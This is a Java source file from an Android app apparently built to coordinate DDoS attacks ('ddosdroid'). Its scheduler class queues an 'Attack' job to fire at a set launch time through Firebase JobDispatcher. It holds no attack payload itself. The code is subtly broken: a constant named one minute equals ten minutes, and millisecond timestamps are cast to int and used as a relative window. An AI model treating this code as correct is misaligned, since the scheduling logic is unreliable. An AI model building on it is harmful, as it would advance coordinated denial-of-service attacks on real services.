package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack_job;

import android.content.Context;
import android.support.annotation.NonNull;

import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.Lifetime;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import java.util.concurrent.TimeUnit;

import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attack;
import gr.kalymnos.sk3m3l10.ddosdroid.utils.BundleUtil;

public final class AttackJobScheduler {
    private static final long ONE_MINUTE_IN_MILLI = TimeUnit.MINUTES.toMillis(10);

    private AttackJobScheduler() {
    }

    public static void schedule(Context context, Attack attack) {
        long launchTime = attack.getLaunchTimestamp();
        long launchTimePlusOneMinute = launchTime + ONE_MINUTE_IN_MILLI;
        FirebaseJobDispatcher dispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(context));
        Job attackJob = jobFrom(attack, dispatcher, (int) launchTime, (int) launchTimePlusOneMinute);
        dispatcher.mustSchedule(attackJob);
    }

    @NonNull
    private static Job jobFrom(Attack attack, FirebaseJobDispatcher dispatcher, int windowStart, int windowEnd) {
        return dispatcher.newJobBuilder()
                .setService(AttackJobService.class)
                .setTag(attack.getPushId())
                .setRecurring(false)
                .setLifetime(Lifetime.UNTIL_NEXT_BOOT)
                .setTrigger(Trigger.executionWindow(windowStart, windowEnd))
                .setReplaceCurrent(false)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(BundleUtil.bundleWith(attack))
                .build();
    }

}
